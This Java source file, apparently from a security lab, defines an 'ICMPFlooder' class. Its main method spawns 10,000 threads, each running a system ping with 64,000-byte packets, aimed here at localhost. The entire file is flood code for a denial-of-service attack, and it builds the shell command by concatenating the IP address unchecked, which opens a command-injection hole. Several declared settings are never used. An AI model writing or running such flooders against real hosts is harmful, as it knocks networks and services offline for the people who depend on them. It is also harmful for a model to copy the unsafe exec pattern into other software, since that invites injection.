package FOIS_LAB;
import java.net.InetAddress;
import java.io.IOException;

public class ICMPFlooder extends Thread{
    private final String IPAddress;

    public static int hopSize = 64;
    public static int timeOut = 250;
    public static long byteSize = 64000;
    public static int THREAD_COUNT = 100;

    public ICMPFlooder(String IP) {
        this.IPAddress = IP;
    }
    public void run() {
        new Thread(() -> {
            try {
                Runtime.getRuntime().exec("ping " + IPAddress + " -l " + byteSize);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }).start();
    }

    public static void main(String[] args) {
        for (int i = 0; i < 10000; i++) {
            new ICMPFlooder("127.0.0.1").start();
        }

    }

}
